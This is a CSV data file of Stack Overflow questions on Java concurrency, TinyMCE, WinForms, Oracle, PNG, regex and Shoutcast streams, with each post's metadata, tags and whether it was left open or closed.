PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus
9942016,03/30/2012 11:25:05,1197249,02/08/2012 13:13:30,310,0,Using AtomicInteger safely to check first,"How can I do ""check-then-act"" in an `AtomicInteger` variable?  
I.e. what is the most safe/best way to check the value of such a variable first and inc/dec depending on result?   
E.g. (in high level)  
`if(count < VALUE) count++;` //atomically using `AtomicInteger`",java,multithreading,concurrency,atomic,,,open
10942255,06/08/2012 02:08:10,1004573,10/20/2011 06:14:46,20,0,Tiny MCE Multiple Instances Submit Trigger Save Problems,"Hi guys I have a problem with Tiny MCE's plugin at the moment.

I have a form where I have multiple instances of Tiny MCE Editors and I need to save the text that is in it. Originally, what happened was that my form would not submit the data in the TinyMCE editors. I have searched up forums and one solution suggested was that I perform tinyMCE.triggerSave() on submit.

I have put that code as in below, however, it still does not do what I expected to do, that is taking what I entered in the data and submitting those with the form submisson.

    $('form').live('submit', function(e){
       // a tiny MCE field exists
        if($('.tinymce').get(0)){
            alert('Triggering Save....');
            tinyMCE.triggerSave();
            alert('Triggered Save! :)');
        }
    });

My question is what other solutions are out there to solve this problem, and If it can't be solved by tinyMCE, is there another editor plugin that will support multiple instances and submit those values on submit.

Any answers will be appreciated.
Thanks guys.",javascript,tinymce,form-submit,multiple-instances,,,open
1749287,11/17/2009 14:32:00,136281,07/10/2009 13:29:55,14,0,how linux run  different microprocessors,"  how linux run different processors, linux kernal compiled using corresponing  compilers,so it run different micprocessors like intel, Sun sparc,MIPS?",linux,,,,,11/17/2009 14:36:19,not a real question
419776,01/07/2009 09:53:01,45603,08/25/2008 09:52:34,920,43,Modal operation using IMessageFilter and DoEvents,"This is a Windows Forms application. I have a function which captures some mouse events modally till a condition is met. For example, I would like to wait for the user to select a point in the window's client area (or optionally cancel the operation using the Escape key) before the function returns. I am using the following structure:

    Application::AddMessageFilter(someFilter);
    while(someFilter->HasUserSelectedAPoint_Or_HitEscapeKey()){
       Application::DoEvents();
    }
    Application::RemoveMessageFilter(someFilter);

This works quite nicely except for taking up nearly 100% CPU usage when control enters the while loop.

What is the right way to use `IMessageFilter`? How do I surrender control to the OS till a message is received? Any `GetMessage` equivalent in the managed world?",winforms,winapi,windows,gui,,,open
9519663,03/01/2012 16:08:45,1136594,01/08/2012 01:08:48,52,0,javascript dateTime - the same format as server,"I have an ajax call, which returns datetime. Javascript displays it using client timezone. I not need in any client timezone, I want to show datetime the same as server return. Is it possible?

I get date via:

    var d = eval('new' + date.replace(/\//g, ' '));",javascript,datetime,,,,,open
10593281,05/15/2012 01:58:06,775602,05/30/2011 01:00:50,97,6,Html 5 vs other technologies,"I have been reading a lot of stuff about HTML 5 recently. Something still looks very fuzzy to me and I hope somebody can help me understand it better.

Is HTML 5 for the ""technology"" to create the UI only? If I need to create an application to access bank accounts, how is it possible that HTML 5 will replace all other technologies? I mean there must be some kind of web service that the application has to use to access the data on the server and I can't see how that piece can be done with HTML 5.
",html5,,,,,05/18/2012 17:15:30,not constructive
11709753,07/29/2012 13:49:53,1494342,07/01/2012 14:12:11,1,0,how to save an NSInteger in NSUserDefaults,"I am trying to save an NSInteger (label) into NSUserDefaults but I have not found a way to do this is it even possibel

Saving the data

    [[NSUserDefaults standardUserDefaults] setInteger:label forKey:@""key1""];

Retrieving the data

    - (void)viewDidLoad {
	label = [[NSUserDefaults standardUserDefaults] integerForKey:@""key1""];
    [super viewDidLoad];",c++,objective-c,xcode,nsuserdefaults,nsinteger,07/30/2012 14:37:14,not a real question
9198866,02/08/2012 17:59:37,660668,03/15/2011 13:41:36,68,1,Merging data between 2 separate Oracle databases,"I've got two separate, unconnected and unconnectable Oracle databases. I need to get information from one to the other as quickly and painlessly as possible.

Typically what I've done up until now when in this situation is create a staging area for the data that needs to be imported (essentially a temporary table just for storing the data until I'm done merging). I copy _all_ of the data that _might_ be needed from the source to that staging area. Then I merge the data as I would if the two tables were connected, meaning of course that I can filter out whatever data I don't need at that time.

Here's the problem in my current case. The source table is _extremely_ large and entirely _un-indexed_ (something over which I have no control, ugh). That means it takes **forever** to get the necessary data if I don't filter it in some way. In addition the destination table really only needs a relatively small subset of the data to do what it needs to do, maybe ten thousand or so distinct rows at a time. In this case I don't want to copy _all_ of the data that _might_ be needed. I just want to copy over the _exact_ data that will be needed, or as close to that as possible.

**tl:dr version**

**Exactly how do I limit my select on the source table based on what I need in the destination table if they can't communicate with each other?**

For example, I might select ID's for the data that is needed in the destination and build the query for the source table based on that. However, that might result in a query with many thousands of OR clauses in it:

    SELECT x, y FROM z WHERE (ID = 1 OR ID = 2 ... OR ID = 10000 OR ID = 10001...)

Or something like that. Is there a better way of doing it?",database,oracle,query,,,,open
7939739,10/29/2011 15:16:51,871202,07/31/2011 02:04:31,293,2,What really is a PNG?,"So I asked this question earlier:

http://stackoverflow.com/questions/7937068/css-box-shadow-not-truly-transparent

And I realize that I do not really know what a .png file is. .bmps are just uncompressed bitmaps, .jpgs are bitmaps compressed using the special jpeg algorithm, and I thought .pngs were just bitmaps compressed losslessly using some special png algorithm.

However, it turns out .pngs can be indexed colors like gifs (still losslessly?) and Adobe Fireworks can make special ""Fireworks PNG""s which are editable, letting the user drag and drop stuff around the image a.l.a. MS Word document but still allowing them to be readable by ""standard"" image processing stuff (browsers, paint.net, etc.) as a normal .png.

What gives? Clearly there is way more to the .png format than just losslessly compressed bitmaps.",image,compression,png,format,fireworks,11/12/2011 19:04:15,off topic
4653118,01/11/2011 00:44:10,460025,09/27/2010 23:07:53,1,0,hidden iframe issue with iphone safari,"Safari iphone/ipad doesn't honor 0px for width and height on an iframe and puts a big one.

Has anyone seen that or found a fix other than setting display to none since 0px seems to work on all the browsers.

",javascript,html,,,,,open
4794520,01/25/2011 14:19:34,588855,08/06/2010 17:52:56,142,1,Multiple inheritance in C++,"As you know, C++ allows `multiple inheritance`. But, would it be a good programming approach to use multiple inheritance or it should be avoided?

Thanks.",c++,multiple-inheritance,,,,01/25/2011 14:22:50,not a real question
10608886,05/15/2012 21:07:14,359862,06/06/2010 19:55:32,3852,47,2 simple regex questions,"**Question 1.**


    String matchedKey = ""sessions.0.something.else"";
    Pattern newP = Pattern.compile(""sessions\\.([^\\.]+)(\\..+)"");
    m = newP.matcher(matchedKey);
    
    System.out.println(m.group(1)); // has nothing. Why?

    sessions\\. // word ""sessions"" followed by .
    ([^\\.]+)   // followed by something that is not a literal . at least once
    (\\..+)     // followed by literal . and anything at least once

I would have expected for m.group(1) to be 0

**Question 2**

    String mask = ""sessions.{env}"";
    String maskRegex = mask.replace(""."", ""\\\\."").replace(""env"", ""(.+)"")
                                       .replace(""{"", """").replace(""}"", """");
    // produces mask ""sessions\\.(.+))""

When used as 

    Pattern newP = Pattern.compile(""sessions\\.(.+))""); // matches  matchedKey (above)
    Pattern newP = Pattern.compile(maskRegex);          // does not match matchedKey (above)

Why is that?",java,regex,,,,,open
9637702,03/09/2012 16:38:39,1259730,03/09/2012 16:28:47,1,0,how do i send variables from form to form in C#,"i need help.
how do i send variables from form1 to form2.   
i need to send two strings and one int from form1   
to form2 and then use them in three separate textboxses 

im a biginner so keep it simple
 
thanks for the help.",c#,forms,,,,03/10/2012 17:42:04,not a real question
5119781,02/25/2011 16:28:46,472677,10/11/2010 20:50:32,1,1,Audio Stream URLs and Problem Solving Stream URLs,"I thought I would share what I went through. This is not a question.  We solved a problem.  I’m sure old media server hounds know about this.  I didn’t.  I hope this saves you time in the future.

Problem: My customer’s Shoutcast listing went away but their provider didn’t. (Shoutcast has listings for many stations as a convenience.  My customer’s used to be: 
http: //yp.shoutcast.com/sbin/tunein-station.pls?id=3012xxx and then it went away!  Their station didn’t.

We were left with several URLs provided us by the station and none of them played via our player.  Within each .pls, .ram file, the same URL was listed (see note) - something like this:

http: //74.53.186.162:9082/

How did we solve the problem?

On the Shoutcast console page above, there is a listen link.  It refers to a URL with a .pls extension.  It also shows the sample rate, number of current listeners, etc.  The URL worked. 

What made this interesting is that file located at that URL actually was a .pls text file with the original URL (something like http: //74.53.186.162:9082/) !

What did I learn?

1. Shoutcast servers know what kind of client is accessing their data.  I would assume the same to be true of IceCast servers.  How did I know?  The circular URL reference.  This means that your player parses text files first much like your browser looks at the mime type.
2. Media player classes that you use in code can be really dumb.  They’re sensitive to mime types, bit rates, extension names, etc.
3. If I have the .pls or other media file, I can use them locally.
4. Hard coded IP addresses are just as bad as they ever were.  Unfortunately, developers don’t have much control over this.

Note: Audio Streams with .pls, .ram, etc are text files that have URLs in them to the actual stream.  The text file has other meta data as well.  If you take the raw URL from the txt file and launch it, you might get a Shoutcast Server interface that gives you stream information that your player might use.  (When viewing a radio station’s website, you can sometimes find the stream URL in the player’s launch parms.  Sometimes they can be different.)",java,android,,,,06/27/2011 17:13:22,not a real question
